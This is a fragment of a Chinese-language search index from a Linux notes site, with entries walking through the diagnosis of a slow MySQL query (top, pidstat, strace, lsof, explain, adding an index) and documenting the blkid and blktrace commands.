\u73b0\u5728\u53ef\u4ee5\u770b\u5230\uff0c\u7d22\u5f15\u5df2\u7ecf\u5efa\u597d\u4e86\u3002\u80fd\u505a\u7684\u90fd\u505a\u5b8c\u4e86\uff0c\u6700\u540e\u5c31\u8be5\u68c0\u67e5\u4e00\u4e0b\uff0c\u6027\u80fd\u95ee\u9898\u662f\u5426\u5df2\u7ecf\u89e3\u51b3\u4e86\u3002 \u6211\u4eec\u5207\u6362\u5230\u7ec8\u7aef\u4e8c\u4e2d\uff0c\u67e5\u770b\u8fd8\u5728\u6267\u884c\u7684 curl \u547d\u4ee4\u7684\u7ed3\u679c\uff1a Got data: ()in 15.383180141448975 sec Got data: ()in 15.384996891021729 sec Got data: ()in 0.0021054744720458984 sec Got data: ()in 0.003951072692871094 sec","title":"SQL\u67e5\u8be2\u6162\u6848\u4f8b"},{"location":"system/linux/IO/SQL%E6%9F%A5%E8%AF%A2%E6%85%A2%E6%A1%88%E4%BE%8B/#sql15","text":"$ curl http://192.168.0.10:10000/products/geektime Got data: () in 15.364538192749023 sec \u63a5\u53e3\u8fd4\u56de\u7684\u662f\u7a7a\u6570\u636e\uff0c\u800c\u4e14\u5904\u7406\u65f6\u95f4\u8d85\u8fc7 15 \u79d2\u3002\u8fd9\u4e48\u6162\u7684\u54cd\u5e94\u901f\u5ea6\u8ba9\u4eba\u65e0\u6cd5\u5fcd\u53d7\uff0c\u5230\u5e95\u51fa\u4e86\u4ec0\u4e48\u95ee\u9898\u5462\uff1f \u4e3a\u4e86\u907f\u514d\u5728\u5206\u6790\u8fc7\u7a0b\u4e2d\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u7ed3\u675f\uff0c\u628a curl \u547d\u4ee4\u653e\u5230\u4e00\u4e2a\u5faa\u73af\u91cc\u6267\u884c\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u907f\u514d\u7ed9\u7cfb\u7edf\u8fc7\u5927\u538b\u529b\uff0c\u6211\u4eec\u8bbe\u7f6e\u5728\u6bcf\u6b21\u67e5\u8be2\u540e\uff0c\u90fd\u5148\u7b49\u5f85 5 \u79d2\uff0c\u7136\u540e\u518d\u5f00\u59cb\u65b0\u7684\u8bf7\u6c42\u3002\u6240\u4ee5\uff0c\u4f60\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e8c\u4e2d\uff0c\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a $ while true; do curl http://192.168.0.10:10000/products/geektime; sleep 5; done \u63a5\u4e0b\u6765\uff0c\u91cd\u65b0\u56de\u5230\u7ec8\u7aef\u4e00\u4e2d\uff0c\u5206\u6790\u63a5\u53e3\u54cd\u5e94\u901f\u5ea6\u6162\u7684\u539f\u56e0\u3002\u4e0d\u8fc7\uff0c\u91cd\u56de\u7ec8\u7aef\u4e00\u540e\uff0c\u4f60\u4f1a\u53d1\u73b0\u7cfb\u7edf\u54cd\u5e94\u4e5f\u660e\u663e\u53d8\u6162\u4e86\uff0c\u968f\u4fbf\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u90fd\u5f97\u505c\u987f\u4e00\u4f1a\u513f\u624d\u80fd\u770b\u5230\u8f93\u51fa\u3002\u8fd9\u8ddf\u4e0a\u4e00\u8282\u7684\u73b0\u8c61\u5f88\u7c7b\u4f3c\uff0c\u770b\u6765\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u89c2\u5bdf\u4e00\u4e0b\u7cfb\u7edf\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\uff0c\u6bd4\u5982 CPU\u3001\u5185\u5b58\u548c\u78c1\u76d8 I/O \u7b49\u7684\u60c5\u51b5\u3002 $ top top - 12:02:15 up 6 days, 8:05, 1 user, load average: 0.66, 0.72, 0.59 Tasks: 137 total, 1 running, 81 sleeping, 0 stopped, 0 zombie %Cpu0 : 0.7 us, 1.3 sy, 0.0 ni, 35.9 id, 62.1 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu1 : 0.3 us, 0.7 sy, 0.0 ni, 84.7 id, 14.3 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 8169300 total, 7238472 free, 546132 used, 384696 buff/cache KiB Swap: 0 total, 0 free, 0 used. 7316952 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 27458 999 20 0 833852 57968 13176 S 1.7 0.7 0:12.40 mysqld 27617 root 20 0 24348 9216 4692 S 1.0 0.1 0:04.40 python 1549 root 20 0 236716 24568 9864 S 0.3 0.3 51:46.57 python3 22421 root 20 0 0 0 0 I 0.3 0.0 0:01.16 kworker/u \u89c2\u5bdf top \u7684\u8f93\u51fa\uff0c\u4e24\u4e2a CPU \u7684 iowait \u90fd\u6bd4\u8f83\u9ad8\uff0c\u7279\u522b\u662f CPU0\uff0ciowait \u5df2\u7ecf\u8d85\u8fc7 60%\u3002\u800c\u5177\u4f53\u5230\u5404\u4e2a\u8fdb\u7a0b\uff0c CPU \u4f7f\u7528\u7387\u5e76\u4e0d\u9ad8\uff0c\u6700\u9ad8\u7684\u4e5f\u53ea\u6709 1.7%\u3002\u65e2\u7136 CPU \u7684\u5acc\u7591\u4e0d\u5927\uff0c\u90a3\u95ee\u9898\u5e94\u8be5\u8fd8\u662f\u51fa\u5728\u4e86 I/O \u4e0a\u3002 \u6211\u4eec\u4ecd\u7136\u5728\u7b2c\u4e00\u4e2a\u7ec8\u7aef\uff0c\u6309\u4e0b Ctrl+C\uff0c\u505c\u6b62 top \u547d\u4ee4\uff1b\u7136\u540e\uff0c\u6267\u884c\u4e0b\u9762\u7684 iostat \u547d\u4ee4\uff0c\u770b\u770b\u6709\u6ca1\u6709 I/O \u6027\u80fd\u95ee\u9898\uff1a # -d\u9009\u9879\u8868\u793a\u5c55\u793a\u8fdb\u7a0b\u7684I/O\u60c5\u51b5 $ pidstat -d 1 12:04:11 UID PID kB_rd/s kB_wr/s kB_ccwr/s iodelay Command 12:04:12 999 27458 32640.00 0.00 0.00 0 mysqld 12:04:12 0 27617 4.00 4.00 0.00 3 python 12:04:12 0 27864 0.00 4.00 0.00 0 systemd-journal \u4ece pidstat \u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u5230\uff0cPID \u4e3a 27458 \u7684 mysqld \u8fdb\u7a0b\u6b63\u5728\u8fdb\u884c\u5927\u91cf\u7684\u8bfb\uff0c\u800c\u4e14\u8bfb\u53d6\u901f\u5ea6\u662f 32 MB/s\uff0c\u8ddf\u521a\u624d iostat \u7684\u53d1\u73b0\u4e00\u81f4\u3002\u4e24\u4e2a\u7ed3\u679c\u4e00\u5bf9\u6bd4\uff0c\u81ea\u7136\u5c31\u627e\u5230\u4e86\u78c1\u76d8 I/O \u74f6\u9888\u7684\u6839\u6e90\uff0c\u5373 mysqld \u8fdb\u7a0b\u3002 \u4e3a\u4ec0\u4e48 mysqld \u4f1a\u53bb\u8bfb\u53d6\u5927\u91cf\u7684\u78c1\u76d8\u6570\u636e\u5462\uff1f\u8fd9\u6709\u53ef\u80fd\u662f\u4e2a\u6162\u67e5\u8be2\u95ee\u9898\u3002\u6162\u67e5\u8be2\u7684\u73b0\u8c61\u5927\u591a\u662f CPU \u4f7f\u7528\u7387\u9ad8\uff08\u6bd4\u5982 100% \uff09\uff0c\u4f46\u8fd9\u91cc\u770b\u5230\u7684\u5374\u662f I/O \u95ee\u9898\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5206\u6790\u4e00\u4e0b MySQL \u8bfb\u53d6\u7684\u6570\u636e\u3002 \u8981\u5206\u6790\u8fdb\u7a0b\u7684\u6570\u636e\u8bfb\u53d6\uff0c\u5f53\u7136\u8fd8\u8981\u9760 strace+ lsof \u7ec4\u5408\u3002 \u63a5\u4e0b\u6765\uff0c\u8fd8\u662f\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u6267\u884c strace \u547d\u4ee4\uff0c\u5e76\u4e14\u6307\u5b9a mysqld \u7684\u8fdb\u7a0b\u53f7 27458\u3002MySQL \u662f\u4e00\u4e2a\u591a\u7ebf\u7a0b\u7684\u6570\u636e\u5e93\u5e94\u7528\uff0c\u4e3a\u4e86\u4e0d\u6f0f\u6389\u8fd9\u4e9b\u7ebf\u7a0b\u7684\u6570\u636e\u8bfb\u53d6\u60c5\u51b5\uff0c\u6267\u884c stace \u547d\u4ee4\u65f6\uff0c\u52a0\u4e0a -f \u53c2\u6570\uff1a $ strace -f -p 27458 [pid 28014] read(38, \"934EiwT363aak7VtqF1mHGa4LL4Dhbks\"..., 131072) = 131072 [pid 28014] read(38, \"hSs7KBDepBqA6m4ce6i6iUfFTeG9Ot9z\"..., 20480) = 20480 [pid 28014] read(38, \"NRhRjCSsLLBjTfdqiBRLvN9K6FRfqqLm\"..., 131072) = 131072 [pid 28014] read(38, \"AKgsik4BilLb7y6OkwQUjjqGeCTQTaRl\"..., 24576) = 24576 [pid 28014] read(38, \"hFMHx7FzUSqfFI22fQxWCpSnDmRjamaW\"..., 131072) = 131072 [pid 28014] read(38, \"ajUzLmKqivcDJSkiw7QWf2ETLgvQIpfC\"..., 20480) = 20480 \u7ebf\u7a0b 28014 \u6b63\u5728\u8bfb\u53d6\u5927\u91cf\u6570\u636e\uff0c\u4e14\u8bfb\u53d6\u6587\u4ef6\u7684\u63cf\u8ff0\u7b26\u7f16\u53f7\u4e3a 38\u3002\u8fd9\u513f\u7684 38 \u53c8\u5bf9\u5e94\u7740\u54ea\u4e2a\u6587\u4ef6\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u7684 lsof \u547d\u4ee4\uff0c\u5e76\u4e14\u6307\u5b9a\u7ebf\u7a0b\u53f7 28014 \uff0c\u5177\u4f53\u67e5\u770b\u8fd9\u4e2a\u53ef\u7591\u7ebf\u7a0b\u548c\u53ef\u7591\u6587\u4ef6\uff1a $ lsof -p 28014 lsof \u5e76\u6ca1\u6709\u7ed9\u51fa\u4efb\u4f55\u8f93\u51fa\u3002\u67e5\u770b lsof \u547d\u4ee4\u7684\u8fd4\u56de\u503c\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\u5931\u8d25\u4e86\u3002 $ echo $? 1 -p \u53c2\u6570\u9700\u8981\u6307\u5b9a\u8fdb\u7a0b\u53f7\uff0c\u800c\u521a\u624d\u4f20\u5165\u7684\u662f\u7ebf\u7a0b\u53f7\uff0c\u6240\u4ee5 lsof \u5931\u8d25\u4e86\u3002 \u628a\u7ebf\u7a0b\u53f7\u6362\u6210\u8fdb\u7a0b\u53f7\uff0c\u7ee7\u7eed\u6267\u884c lsof \u547d\u4ee4\uff1a $ lsof -p 27458 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ... mysqld 27458 999 38u REG 8,1 512440000 2601895 /var/lib/mysql/test/products.MYD \u5f97\u5230\u4e86 lsof \u7684\u8f93\u51fa\u3002\u4ece\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c mysqld \u8fdb\u7a0b\u786e\u5b9e\u6253\u5f00\u4e86\u5927\u91cf\u6587\u4ef6\uff0c\u800c\u6839\u636e\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08FD\uff09\u7684\u7f16\u53f7\uff0c\uff0c\u63cf\u8ff0\u7b26\u4e3a 38 \u7684\u662f\u4e00\u4e2a\u8def\u5f84\u4e3a /var/lib/mysql/test/products.MYD \u7684\u6587\u4ef6\u3002 38 \u540e\u9762\u7684 u \u8868\u793a\uff0c mysqld \u4ee5\u8bfb\u5199\u7684\u65b9\u5f0f\u8bbf\u95ee\u6587\u4ef6\u3002\uff1a MYD \u6587\u4ef6\uff0c\u662f MyISAM \u5f15\u64ce\u7528\u6765\u5b58\u50a8\u8868\u6570\u636e\u7684\u6587\u4ef6\uff1b \u6587\u4ef6\u540d\u5c31\u662f\u6570\u636e\u8868\u7684\u540d\u5b57\uff1b \u800c\u8fd9\u4e2a\u6587\u4ef6\u7684\u7236\u76ee\u5f55\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002 mysqld \u5728\u8bfb\u53d6\u6570\u636e\u5e93 test \u4e2d\u7684 products \u8868\u3002\u5b9e\u9645\u4e0a\uff0c\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u67e5\u770b mysqld \u5728\u7ba1\u7406\u6570\u636e\u5e93 test \u65f6\u7684\u5b58\u50a8\u6587\u4ef6\u3002\u4e0d\u8fc7\u8981\u6ce8\u610f\uff0c\u7531\u4e8e MySQL \u8fd0\u884c\u5728\u5bb9\u5668\u4e2d\uff0c\u4f60\u9700\u8981\u901a\u8fc7 docker exec \u5230\u5bb9\u5668\u4e2d\u67e5\u770b\uff1a $ docker exec -it mysql ls /var/lib/mysql/test/ db.opt products.MYD products.MYI products.frm \u4ece\u8fd9\u91cc\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0c/var/lib/mysql/test/ \u76ee\u5f55\u4e2d\u6709\u56db\u4e2a\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u5206\u522b\u662f\uff1a MYD \u6587\u4ef6\u7528\u6765\u5b58\u50a8\u8868\u7684\u6570\u636e\uff1b MYI \u6587\u4ef6\u7528\u6765\u5b58\u50a8\u8868\u7684\u7d22\u5f15\uff1b frm \u6587\u4ef6\u7528\u6765\u5b58\u50a8\u8868\u7684\u5143\u4fe1\u606f\uff08\u6bd4\u5982\u8868\u7ed3\u6784\uff09\uff1b opt \u6587\u4ef6\u5219\u7528\u6765\u5b58\u50a8\u6570\u636e\u5e93\u7684\u5143\u4fe1\u606f\uff08\u6bd4\u5982\u5b57\u7b26\u96c6\u3001\u5b57\u7b26\u6821\u9a8c\u89c4\u5219\u7b49\uff09\u3002 \u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u662f\u4e0d\u662f mysqld \u6b63\u5728\u4f7f\u7528\u7684\u6570\u636e\u5e93\u6587\u4ef6\u5462\uff1f\u6709\u6ca1\u6709\u53ef\u80fd\u662f\u4e0d\u518d\u4f7f\u7528\u7684\u65e7\u6570\u636e\u5462\uff1f\u5176\u5b9e\uff0c\u8fd9\u4e2a\u5f88\u5bb9\u6613\u786e\u8ba4\uff0c\u67e5\u4e00\u4e0b mysqld \u914d\u7f6e\u7684\u6570\u636e\u8def\u5f84\u5373\u53ef\u3002\u4f60\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a $ docker exec -i -t mysql mysql -e 'show global variables like \"%datadir%\";' +---------------+-----------------+ | Variable_name | Value | +---------------+-----------------+ | datadir | /var/lib/mysql/ | +---------------+-----------------+ \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\uff0c/var/lib/mysql/ \u786e\u5b9e\u662f mysqld \u6b63\u5728\u4f7f\u7528\u7684\u6570\u636e\u5b58\u50a8\u76ee\u5f55\u3002\u521a\u624d\u5206\u6790\u5f97\u51fa\u7684\u6570\u636e\u5e93 test \u548c\u6570\u636e\u8868 products \uff0c\u90fd\u662f\u6b63\u5728\u4f7f\u7528\u3002 \u65e2\u7136\u5df2\u7ecf\u627e\u51fa\u4e86\u6570\u636e\u5e93\u548c\u8868\uff0c\u63a5\u4e0b\u6765\u8981\u505a\u7684\uff0c\u5c31\u662f\u5f04\u6e05\u695a\u6570\u636e\u5e93\u4e2d\u6b63\u5728\u6267\u884c\u4ec0\u4e48\u6837\u7684 SQL \u4e86\u3002\u6211\u4eec\u7ee7\u7eed\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 docker exec \u547d\u4ee4\uff0c\u8fdb\u5165 MySQL \u7684\u547d\u4ee4\u884c\u754c\u9762\uff1a \u4e0d\u8fc7\uff0c\u4e3a\u4e86\u4fdd\u8bc1 SQL \u8bed\u53e5\u4e0d\u622a\u65ad\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6267\u884c show full processlist \u547d\u4ee4\u3002\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u8f93\u51fa\uff1a mysql> show full processlist; +----+------+-----------------+------+---------+------+--------------+-----------------------------------------------------+ | Id | User | Host | db | Command | Time | State | Info | +----+------+-----------------+------+---------+------+--------------+-----------------------------------------------------+ | 27 | root | localhost | test | Query | 0 | init | show full processlist | | 28 | root | 127.0.0.1:42262 | test | Query | 1 | Sending data | select * from products where productName='geektime' | +----+------+-----------------+------+---------+------+--------------+-----------------------------------------------------+ 2 rows in set (0.00 sec) \u8fd9\u4e2a\u8f93\u51fa\u4e2d\uff0c db \u8868\u793a\u6570\u636e\u5e93\u7684\u540d\u5b57\uff1b Command \u8868\u793a SQL \u7c7b\u578b\uff1b Time \u8868\u793a\u6267\u884c\u65f6\u95f4\uff1b State \u8868\u793a\u72b6\u6001\uff1b \u800c Info \u5219\u5305\u542b\u4e86\u5b8c\u6574\u7684 SQL \u8bed\u53e5\u3002 \u591a\u6267\u884c\u51e0\u6b21 show full processlist \u547d\u4ee4\uff0c\u4f60\u53ef\u770b\u5230 select * from products where productName=\u2018geektime\u2019 \u8fd9\u6761 SQL \u8bed\u53e5\u7684\u6267\u884c\u65f6\u95f4\u6bd4\u8f83\u957f\u3002 \u5176\u5b9e\uff0cMySQL \u5185\u7f6e\u7684 explain \u547d\u4ee4\uff0c\u5c31\u53ef\u4ee5\u5e2e\u4f60\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u7ee7\u7eed\u5728 MySQL \u7ec8\u7aef\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 explain \u547d\u4ee4\uff1a # \u5207\u6362\u5230test\u5e93 mysql> use test; # \u6267\u884cexplain\u547d\u4ee4 mysql> explain select * from products where productName='geektime'; +----+-------------+----------+------+---------------+------+---------+------+-------+-------------+ | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra | +----+-------------+----------+------+---------------+------+---------+------+-------+-------------+ | 1 | SIMPLE | products | ALL | NULL | NULL | NULL | NULL | 10000 | Using where | +----+-------------+----------+------+---------------+------+---------+------+-------+-------------+ 1 row in set (0.00 sec) \u89c2\u5bdf\u8fd9\u6b21\u7684\u8f93\u51fa\u3002\u8fd9\u4e2a\u754c\u9762\u4e2d\uff0c\u6709\u51e0\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u5b57\u6bb5\u9700\u8981\u4f60\u6ce8\u610f\uff0c\u6211\u5c31\u4ee5\u8fd9\u4e2a\u8f93\u51fa\u4e3a\u4f8b\uff0c\u5206\u522b\u89e3\u91ca\u4e00\u4e0b\uff1a select_type \u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u800c\u8fd9\u91cc\u7684 SIMPLE \u8868\u793a\u6b64\u67e5\u8be2\u4e0d\u5305\u62ec UNION \u67e5\u8be2\u6216\u8005\u5b50\u67e5\u8be2\uff1b table \u8868\u793a\u6570\u636e\u8868\u7684\u540d\u5b57\uff0c\u8fd9\u91cc\u662f products\uff1b type \u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u8fd9\u91cc\u7684 ALL \u8868\u793a\u5168\u8868\u67e5\u8be2\uff0c\u4f46\u7d22\u5f15\u67e5\u8be2\u5e94\u8be5\u662f index \u7c7b\u578b\u624d\u5bf9\uff1b possible_keys \u8868\u793a\u53ef\u80fd\u9009\u7528\u7684\u7d22\u5f15\uff0c\u8fd9\u91cc\u662f NULL\uff1b key \u8868\u793a\u786e\u5207\u4f1a\u4f7f\u7528\u7684\u7d22\u5f15\uff0c\u8fd9\u91cc\u4e5f\u662f NULL\uff1b rows \u8868\u793a\u67e5\u8be2\u626b\u63cf\u7684\u884c\u6570\uff0c\u8fd9\u91cc\u662f 10000\u3002 \u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u8fd9\u6761\u67e5\u8be2\u8bed\u53e5\u538b\u6839\u513f\u6ca1\u6709\u4f7f\u7528\u7d22\u5f15\uff0c\u6240\u4ee5\u67e5\u8be2\u65f6\uff0c\u4f1a\u626b\u63cf\u5168\u8868\uff0c\u5e76\u4e14\u626b\u63cf\u884c\u6570\u9ad8\u8fbe 10000 \u884c\u3002\u54cd\u5e94\u901f\u5ea6\u90a3\u4e48\u6162\u4e5f\u5c31\u96be\u602a\u4e86\u3002 mysql> CREATE INDEX products_index ON products (productName(64)); Query OK, 10000 rows affected (14.45 sec) Records: 10000 Duplicates: 0 Warnings: 0 \u73b0\u5728\u53ef\u4ee5\u770b\u5230\uff0c\u7d22\u5f15\u5df2\u7ecf\u5efa\u597d\u4e86\u3002\u80fd\u505a\u7684\u90fd\u505a\u5b8c\u4e86\uff0c\u6700\u540e\u5c31\u8be5\u68c0\u67e5\u4e00\u4e0b\uff0c\u6027\u80fd\u95ee\u9898\u662f\u5426\u5df2\u7ecf\u89e3\u51b3\u4e86\u3002 \u6211\u4eec\u5207\u6362\u5230\u7ec8\u7aef\u4e8c\u4e2d\uff0c\u67e5\u770b\u8fd8\u5728\u6267\u884c\u7684 curl \u547d\u4ee4\u7684\u7ed3\u679c\uff1a Got data: ()in 15.383180141448975 sec Got data: ()in 15.384996891021729 sec Got data: ()in 0.0021054744720458984 sec Got data: ()in 0.003951072692871094 sec","title":"\u4e00\u4e2aSQL\u67e5\u8be2\u898115\u79d2\uff0c\u8fd9\u662f\u600e\u4e48\u56de\u4e8b\uff1f"},{"location":"system/linux/IO/blkid/","text":"blkid\u547d\u4ee4 blkid\u7a0b\u5e8f\u662f\u4f7f\u7528libblkid\u5e93\u7684\u547d\u4ee4\u884c\u754c\u9762\u3002\u5b83\u53ef\u4ee5\u786e\u5b9a\u5757\u8bbe\u5907\u6301\u6709\u7684\u5185\u5bb9\u7c7b\u578b\uff08\u4f8b\u5982\u6587\u4ef6\u7cfb\u7edf\u3001\u4ea4\u6362\uff09\uff0c\u4ee5\u53ca\u5185\u5bb9\u5143\u6570\u636e\u4e2d\u7684\u5c5e\u6027\uff08\u4ee4\u724c\u3001\u540d\u79f0=\u503c\u5bf9\uff09\uff08\u4f8b\u5982LABEL\u6216UUID\u5b57\u6bb5\uff09\u3002 blkid\u6709\u4e24\u79cd\u4e3b\u8981\u7684\u64cd\u4f5c\u5f62\u5f0f\uff1a\u8981\u4e48\u641c\u7d22\u5177\u6709\u7279\u5b9aNAME=\u503c\u5bf9\u7684\u8bbe\u5907\uff0c\u8981\u4e48\u663e\u793a\u4e00\u4e2a\u6216\u591a\u4e2a\u8bbe\u5907\u7684NAME=\u503c\u914d\u5bf9\u3002 blkid \u547d\u4ee4\uff0cLinux blkid \u547d\u4ee4\u8be6\u89e3\uff1a\u67e5\u770b\u5757\u8bbe\u5907\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\u3001LABEL\u3001UUID\u7b49\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) blkid\uff088\uff09 - Linux \u624b\u518c\u9875 (die.net) \u663e\u793a\u78c1\u76d8label\u53cauuid #blkid","title":"blkid\u547d\u4ee4"},{"location":"system/linux/IO/blkid/#blkid","text":"blkid\u7a0b\u5e8f\u662f\u4f7f\u7528libblkid\u5e93\u7684\u547d\u4ee4\u884c\u754c\u9762\u3002\u5b83\u53ef\u4ee5\u786e\u5b9a\u5757\u8bbe\u5907\u6301\u6709\u7684\u5185\u5bb9\u7c7b\u578b\uff08\u4f8b\u5982\u6587\u4ef6\u7cfb\u7edf\u3001\u4ea4\u6362\uff09\uff0c\u4ee5\u53ca\u5185\u5bb9\u5143\u6570\u636e\u4e2d\u7684\u5c5e\u6027\uff08\u4ee4\u724c\u3001\u540d\u79f0=\u503c\u5bf9\uff09\uff08\u4f8b\u5982LABEL\u6216UUID\u5b57\u6bb5\uff09\u3002 blkid\u6709\u4e24\u79cd\u4e3b\u8981\u7684\u64cd\u4f5c\u5f62\u5f0f\uff1a\u8981\u4e48\u641c\u7d22\u5177\u6709\u7279\u5b9aNAME=\u503c\u5bf9\u7684\u8bbe\u5907\uff0c\u8981\u4e48\u663e\u793a\u4e00\u4e2a\u6216\u591a\u4e2a\u8bbe\u5907\u7684NAME=\u503c\u914d\u5bf9\u3002 blkid \u547d\u4ee4\uff0cLinux blkid \u547d\u4ee4\u8be6\u89e3\uff1a\u67e5\u770b\u5757\u8bbe\u5907\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\u3001LABEL\u3001UUID\u7b49\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) blkid\uff088\uff09 - Linux \u624b\u518c\u9875 (die.net) \u663e\u793a\u78c1\u76d8label\u53cauuid #blkid","title":"blkid\u547d\u4ee4"},{"location":"system/linux/IO/blktrace/","text":"\u8ddf\u8e2aIO\u7cfb\u5217 blktrace\u547d\u4ee4 \u8bed\u6cd5 blktrace -d dev [ -r debugfs_path ] [ -o output ] [-k ] [ -w time ] [ -a action ] [ -A action_mask ] [ -v ] \u547d\u4ee4\u9009\u9879 blktrace\u662f\u4e00\u4e2a\u5757\u5c42IO\u8ddf\u8e2a\u547d\u4ee4 $ blktrace -help -d <dev> | --dev=<dev> \u586b\u5199\u4e00\u4e2a\u8ddf\u8e2a\u7684\u78c1\u76d8\uff0c\u5fc5\u586b\u9009\u9879 [ -r <debugfs path> | --relay=<debugfs path> ] \u6307\u5b9adebugfs\u7684\u6302\u8f7d\u8def\u5f84 [ -o <file> | --output=<file>] \u8f93\u51fa\u7684\u6587\u4ef6\u53eb\u4ec0\u4e48,\u9ed8\u8ba4\u503c\u4e3a device.blktrace.cpu\u3002 -o - \u53ef\u4ee5\u628a\u8f93\u51fa\u6253\u5370\u5c4f\u5e55\u4e0a [ -D <dir> | --output-dir=<dir> \u8f93\u51fa\u7684\u76ee\u5f55 [ -w <time> | --stopwatch=<time>] \u8ddf\u8e2a\u7684\u65f6\u957f\uff0c\u9ed8\u8ba4\u5355\u4f4d\u4e3a\u79d2 [ -a <action field> | --act-mask=<action field>] \u8ddf\u8e2a\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a [ -A <action mask> | --set-mask=<action mask>] \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8ddf\u8e2a\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a [ -b <size> | --buffer-size] \u7f13\u5b58\u533a\u7684\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a512KB\uff0c\u9ed8\u8ba4\u5355\u4f4d\u4e3aK [ -n <number> | --num-sub-buffers=<number>] \u9ed8\u8ba4\u7f13\u5b58\u533a\u7684\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a4\u4e2a [ -l | --listen] \u5f00\u542f\u76d1\u542c\uff08blktrace\u670d\u52a1\u5668\u6a21\u5f0f\uff09 [ -h <hostname> | --host=<hostname>] \u5ba2\u6237\u7aef\u6a21\u5f0f\uff0c\u8981\u94fe\u63a5\u54ea\u4e2a\u4e3b\u673a\u4e0a [ -p <port number> | --port=<port number>] \u7f51\u7edc\u6a21\u5f0f\u8981\u4f7f\u7528\u54ea\u4e2a\u7aef\u53e3\u9ed8\u8ba4\u4e3a8462 [ -s | --no-sendfile] \u5728\u7f51\u7edc\u5ba2\u6237\u7aef\u6a21\u5f0f\u4e0b\uff0c\u4e0d\u4f7f\u7528sendfile()\u7cfb\u7edf\u8c03\u7528\u6765\u4f20\u8f93\u6570\u636e [ -I <devs file> | --input-devs=<devs file>] \u8f93\u5165\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6\u4f5c\u4e3a\u8bbe\u7f6e [ -v <version> | --version] \u6253\u5370\u7248\u672c [ -V <version> | --version] \u6253\u5370\u7248\u672c -d Use specified device. May also be given last after options \u8ddf\u8e2a\u4e00\u4e2a\u8bbe\u5907\uff0c\u53ef\u4ee5\u653e\u5728\u6700\u540e -r Path to mounted debugfs, defaults to /sys/kernel/debug \u6307\u5b9adebugfs\u7684\u6302\u8f7d\u8def\u5f84\uff0c\u9ed8\u8ba4\u6307\u5411/sys/kernel/debug -o File(s) to send output to \u8981\u8f93\u51fa\u53d1\u9001\u5230\u54ea\u4e2a\u6587\u4ef6\u4e2d -D Directory to prepend to output file names \u8f93\u51fa\u6587\u4ef6\u5728\u54ea\u4e2a\u76ee\u5f55\u4e2d -w Stop after defined time, in seconds \u8981\u8ddf\u8e2a\u591a\u5c11\u79d2 -a Only trace specified actions. See documentation \u4ec5\u4ec5\u8ddf\u8e2a\u4e00\u4e2a\u78c1\u76d8\u884c\u4e3a \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a-a -A Give trace mask as a single value. See documentation \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8ddf\u8e2a\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a -b Sub buffer size in KiB (default 512) \u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a512K\uff0c\u5355\u4f4d\u4e3aK -n Number of sub buffers (default 4) \u7f13\u51b2\u533a\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a4\u4e2a -l Run in network listen mode (blktrace server) \u8fd0\u884cblktrace\u4e3a\u670d\u52a1\u7aef\u6a21\u5f0f\uff0c\u6253\u5f00\u76d1\u542c -h Run in network client mode, connecting to the given host 